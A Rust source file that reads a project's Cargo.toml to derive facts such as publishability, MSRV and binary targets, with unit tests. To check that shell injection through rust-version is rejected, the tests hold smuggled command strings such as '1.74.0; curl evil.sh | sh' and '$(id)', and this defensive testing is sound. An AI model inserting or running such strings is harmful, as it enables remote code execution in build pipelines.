use crate::config::android::is_toolchain_version;
use cargo_toml::Manifest;
use std::fs;
use std::path::Path;

/// Facts about a Rust project (root Cargo.toml)
#[derive(Debug, Clone, Default)]
pub struct RustFacts {
    pub is_workspace: bool,
    /// The root package exists and is not `publish = false`
    pub publishable: bool,
    /// A bare `cargo publish` of the root package goes to crates.io. Not so
    /// when `publish` lists only other registries — cargo picks a sole listed
    /// registry by itself, and refuses to guess between several — or lists
    /// crates.io beside others, where it wants `--registry` too.
    pub publishes_to_crates_io: bool,
    pub package_name: Option<String>,
    /// The `rust-version` of the root package (of `[workspace.package]` for a
    /// virtual workspace), if declared and well-formed
    pub msrv: Option<String>,
    /// The root manifest declares at least one feature
    pub has_features: bool,
    /// The root package is a library crate ([lib] section or src/lib.rs)
    pub is_library: bool,
    /// The root package has at least one binary target: a `[[bin]]`
    /// section, or (unless `autobins = false`) a `src/main.rs` or anything
    /// under `src/bin/`. A crate is commonly both: a library with a thin
    /// `src/main.rs` over it still builds an executable.
    pub has_binaries: bool,
}

/// Whether `src/bin/` holds an auto-discovered binary target: a `.rs` file,
/// or a directory with a `main.rs` in it
fn has_bin_dir_targets(path: &Path) -> bool {
    let Ok(entries) = fs::read_dir(path.join("src/bin")) else {
        return false;
    };
    entries.flatten().any(|entry| {
        let path = entry.path();
        if path.is_dir() {
            path.join("main.rs").is_file()
        } else {
            path.extension().is_some_and(|ext| ext == "rs")
        }
    })
}

pub(super) fn gather(path: &Path) -> Option<RustFacts> {
    let contents = fs::read_to_string(path.join("Cargo.toml")).ok()?;
    let mut manifest = Manifest::from_str(&contents).ok()?;

    // A root package that is also the workspace root commonly takes
    // `rust-version.workspace = true` (and `publish`) from its own
    // `[workspace.package]`. `from_str` leaves those unresolved, which would
    // hide the MSRV from detection; resolve them from this same file only —
    // detection reads the project, not whatever workspace lies above it.
    if let Some(template) = manifest.workspace.as_ref().and_then(|w| w.package.clone()) {
        if let Some(package) = manifest.package.as_mut() {
            if let Some(rust_version) = &template.rust_version {
                if let Some(inheritable) = package.rust_version.as_mut() {
                    inheritable.inherit(rust_version);
                }
            }
            package.publish.inherit(&template.publish);
        }
    }

    let package = manifest.package.as_ref();
    let publish = package.map(|p| p.publish.get());
    let publishable = match publish {
        None => false,
        Some(Ok(cargo_toml::Publish::Flag(flag))) => *flag,
        Some(Ok(cargo_toml::Publish::Registry(registries))) => !registries.is_empty(),
        // Inherited from a workspace outside this manifest; assume publishable
        Some(Err(_)) => true,
    };
    let publishes_to_crates_io = match publish {
        Some(Ok(cargo_toml::Publish::Registry(registries))) => {
            matches!(registries.as_slice(), [only] if only == "crates-io")
        }
        _ => publishable,
    };

    // The rust-msrv rule bakes this fact into `rustup toolchain install
    // {msrv}` and `cargo +{msrv} check`, so a manifest from a repository we
    // did not write gets to put text in a generated `run:` step. Anything but
    // a bare version is either one no toolchain could resolve or shell being
    // smuggled in, and in both cases the fact is better off absent — the
    // rule falls back to reading the version in shell, where it stays quoted.
    //
    // A virtual workspace has no root package to declare one; its
    // `[workspace.package]` rust-version is the version every member that
    // inherits it builds with, and the one `cargo +{msrv} check` at the root
    // checks them all against.
    let msrv = match package {
        Some(p) => p.rust_version.as_ref().and_then(|v| v.get().ok()),
        None => manifest
            .workspace
            .as_ref()
            .and_then(|w| w.package.as_ref())
            .and_then(|template| template.rust_version.as_ref()),
    }
    .filter(|v| is_toolchain_version(v))
    .cloned();

    // `from_str` never looks at the filesystem, so `manifest.bin` holds only
    // the explicit `[[bin]]` sections; the targets cargo would discover on
    // its own are found here the same way it does
    let has_binaries = !manifest.bin.is_empty()
        || package.is_some_and(|p| p.autobins)
            && (path.join("src/main.rs").is_file() || has_bin_dir_targets(path));

    Some(RustFacts {
        is_workspace: manifest.workspace.is_some(),
        publishable,
        publishes_to_crates_io,
        package_name: package.map(|p| p.name().to_string()),
        msrv,
        has_features: !manifest.features.is_empty(),
        is_library: manifest.lib.is_some() || path.join("src/lib.rs").is_file(),
        has_binaries,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;

    fn facts_for(cargo_toml: &str) -> Option<RustFacts> {
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("Cargo.toml"), cargo_toml).unwrap();
        gather(dir.path())
    }

    #[test]
    fn test_no_cargo_toml() {
        let dir = tempdir().unwrap();
        assert!(gather(dir.path()).is_none());
    }

    #[test]
    fn test_package_is_publishable() {
        let facts = facts_for("[package]\nname = \"lib\"\nversion = \"0.1.0\"\n").unwrap();
        assert!(facts.publishable);
        assert!(!facts.is_workspace);
        assert_eq!(facts.package_name.as_deref(), Some("lib"));
    }

    #[test]
    fn test_publish_false_is_not_publishable() {
        let facts =
            facts_for("[package]\nname = \"app\"\nversion = \"0.1.0\"\npublish = false\n")
                .unwrap();
        assert!(!facts.publishable);
        assert!(!facts.publishes_to_crates_io);
    }

    #[test]
    fn test_publish_registry_list_decides_crates_io() {
        for (publish, publishable, crates_io) in [
            // No `publish` key is crates.io
            ("", true, true),
            ("publish = true\n", true, true),
            (r#"publish = ["crates-io"]"#, true, true),
            // cargo publishes to a sole listed registry by itself, so
            // crates.io never sees the crate
            (r#"publish = ["my-registry"]"#, true, false),
            // and with several it refuses to run without `--registry`
            (r#"publish = ["crates-io", "my-registry"]"#, true, false),
            ("publish = []\n", false, false),
        ] {
            let facts = facts_for(&format!(
                "[package]\nname = \"lib\"\nversion = \"0.1.0\"\n{publish}\n"
            ))
            .unwrap();
            assert_eq!(facts.publishable, publishable, "{publish}");
            assert_eq!(facts.publishes_to_crates_io, crates_io, "{publish}");
        }

        // A virtual workspace has no package to publish
        let facts = facts_for("[workspace]\nmembers = [\"a\"]\n").unwrap();
        assert!(!facts.publishes_to_crates_io);
    }

    #[test]
    fn test_msrv_from_rust_version() {
        let facts = facts_for(
            "[package]\nname = \"lib\"\nversion = \"0.1.0\"\nrust-version = \"1.74.0\"\n",
        )
        .unwrap();
        assert_eq!(facts.msrv.as_deref(), Some("1.74.0"));

        let facts = facts_for("[package]\nname = \"lib\"\nversion = \"0.1.0\"\n").unwrap();
        assert_eq!(facts.msrv, None);

        // Two components are as valid as three
        let facts =
            facts_for("[package]\nname = \"lib\"\nversion = \"0.1.0\"\nrust-version = \"1.74\"\n")
                .unwrap();
        assert_eq!(facts.msrv.as_deref(), Some("1.74"));
    }

    #[test]
    fn test_msrv_inherited_from_own_workspace_package() {
        let facts = facts_for(
            "[workspace]\nmembers = [\"a\"]\n\n[workspace.package]\nrust-version = \"1.80\"\npublish = false\n\n\
             [package]\nname = \"root\"\nversion = \"0.1.0\"\nrust-version.workspace = true\npublish.workspace = true\n",
        )
        .unwrap();
        assert_eq!(facts.msrv.as_deref(), Some("1.80"));
        assert!(!facts.publishable);

        // The inherited value is held to the same standard as a direct one
        let facts = facts_for(
            "[workspace]\n\n[workspace.package]\nrust-version = \"$(id)\"\n\n\
             [package]\nname = \"root\"\nversion = \"0.1.0\"\nrust-version.workspace = true\n",
        )
        .unwrap();
        assert_eq!(facts.msrv, None);
    }

    #[test]
    fn test_msrv_inherited_from_outer_workspace_is_absent() {
        // The workspace isn't in this manifest, so there is nothing to read
        let facts = facts_for(
            "[package]\nname = \"member\"\nversion = \"0.1.0\"\nrust-version.workspace = true\npublish.workspace = true\n",
        )
        .unwrap();
        assert_eq!(facts.msrv, None);
        assert!(facts.publishable);
    }

    #[test]
    fn test_malformed_rust_version_is_absent() {
        // The rule interpolates this fact into a shell command, so anything
        // that isn't a bare version must not become a fact — the rest of the
        // manifest is still read
        for rust_version in [
            "1.74.0; curl evil.sh | sh",
            "1.74.0 --profile minimal",
            "$(id)",
            ">=1.74",
            "1.74.0-nightly",
            "stable",
            "1.2.3.4",
            "",
        ] {
            let facts = facts_for(&format!(
                "[package]\nname = \"lib\"\nversion = \"0.1.0\"\nrust-version = \"{rust_version}\"\n"
            ))
            .unwrap();
            assert_eq!(facts.msrv, None, "rust-version {rust_version:?}");
            assert_eq!(facts.package_name.as_deref(), Some("lib"));
        }
    }

    #[test]
    fn test_has_features() {
        let facts = facts_for(
            "[package]\nname = \"lib\"\nversion = \"0.1.0\"\n\n[features]\nfoo = []\n",
        )
        .unwrap();
        assert!(facts.has_features);

        let facts = facts_for("[package]\nname = \"lib\"\nversion = \"0.1.0\"\n").unwrap();
        assert!(!facts.has_features);
    }

    #[test]
    fn test_library_detected_from_lib_rs() {
        let dir = tempdir().unwrap();
        fs::write(
            dir.path().join("Cargo.toml"),
            "[package]\nname = \"lib\"\nversion = \"0.1.0\"\n",
        )
        .unwrap();
        assert!(!gather(dir.path()).unwrap().is_library);

        fs::create_dir(dir.path().join("src")).unwrap();
        fs::write(dir.path().join("src/lib.rs"), "").unwrap();
        assert!(gather(dir.path()).unwrap().is_library);
    }

    #[test]
    fn test_library_detected_from_lib_section() {
        let facts = facts_for(
            "[package]\nname = \"lib\"\nversion = \"0.1.0\"\n\n[lib]\nname = \"foo\"\n",
        )
        .unwrap();
        assert!(facts.is_library);
    }

    #[test]
    fn test_binaries_detected_from_main_rs_and_bin_dir() {
        let dir = tempdir().unwrap();
        let manifest = "[package]\nname = \"app\"\nversion = \"0.1.0\"\n";
        fs::write(dir.path().join("Cargo.toml"), manifest).unwrap();
        fs::create_dir_all(dir.path().join("src/bin")).unwrap();
        assert!(!gather(dir.path()).unwrap().has_binaries);

        // A library with a thin src/main.rs over it is still a binary crate
        fs::write(dir.path().join("src/lib.rs"), "").unwrap();
        fs::write(dir.path().join("src/main.rs"), "fn main() {}").unwrap();
        let facts = gather(dir.path()).unwrap();
        assert!(facts.is_library);
        assert!(facts.has_binaries);

        fs::remove_file(dir.path().join("src/main.rs")).unwrap();
        assert!(!gather(dir.path()).unwrap().has_binaries);

        // src/bin/<name>.rs and src/bin/<name>/main.rs are both targets;
        // anything else in there is not
        fs::write(dir.path().join("src/bin/notes.txt"), "").unwrap();
        assert!(!gather(dir.path()).unwrap().has_binaries);
        fs::write(dir.path().join("src/bin/tool.rs"), "fn main() {}").unwrap();
        assert!(gather(dir.path()).unwrap().has_binaries);
        fs::remove_file(dir.path().join("src/bin/tool.rs")).unwrap();
        fs::create_dir(dir.path().join("src/bin/nested")).unwrap();
        assert!(!gather(dir.path()).unwrap().has_binaries);
        fs::write(dir.path().join("src/bin/nested/main.rs"), "fn main() {}").unwrap();
        assert!(gather(dir.path()).unwrap().has_binaries);
    }

    #[test]
    fn test_binaries_detected_from_bin_section() {
        // An explicit target counts wherever its source lives
        let facts = facts_for(
            "[package]\nname = \"app\"\nversion = \"0.1.0\"\n\n[[bin]]\nname = \"tool\"\npath = \"tools/tool.rs\"\n",
        )
        .unwrap();
        assert!(facts.has_binaries);
    }

    #[test]
    fn test_autobins_false_hides_main_rs() {
        let dir = tempdir().unwrap();
        fs::write(
            dir.path().join("Cargo.toml"),
            "[package]\nname = \"app\"\nversion = \"0.1.0\"\nautobins = false\n",
        )
        .unwrap();
        fs::create_dir(dir.path().join("src")).unwrap();
        fs::write(dir.path().join("src/main.rs"), "fn main() {}").unwrap();
        assert!(!gather(dir.path()).unwrap().has_binaries);
    }

    #[test]
    fn test_workspace_without_root_package() {
        let facts = facts_for("[workspace]\nmembers = [\"a\", \"b\"]\n").unwrap();
        assert!(facts.is_workspace);
        assert_eq!(facts.package_name, None);
        assert!(!facts.publishable);
        // The members' targets aren't read, so none are claimed
        assert!(!facts.has_binaries);
    }

    #[test]
    fn test_msrv_of_virtual_workspace_from_workspace_package() {
        let facts = facts_for(
            "[workspace]\nmembers = [\"a\", \"b\"]\n\n[workspace.package]\nrust-version = \"1.75\"\n",
        )
        .unwrap();
        assert_eq!(facts.package_name, None);
        assert_eq!(facts.msrv.as_deref(), Some("1.75"));

        // Held to the same standard as a package's own rust-version
        let facts = facts_for(
            "[workspace]\nmembers = [\"a\"]\n\n[workspace.package]\nrust-version = \"$(id)\"\n",
        )
        .unwrap();
        assert_eq!(facts.msrv, None);

        let facts = facts_for("[workspace]\nmembers = [\"a\"]\n").unwrap();
        assert_eq!(facts.msrv, None);
    }

    #[test]
    fn test_root_package_without_msrv_ignores_workspace_template() {
        // The root package is what gets checked; a template it doesn't
        // inherit from says nothing about it
        let facts = facts_for(
            "[workspace]\n\n[workspace.package]\nrust-version = \"1.80\"\n\n\
             [package]\nname = \"root\"\nversion = \"0.1.0\"\n",
        )
        .unwrap();
        assert_eq!(facts.msrv, None);
    }
}
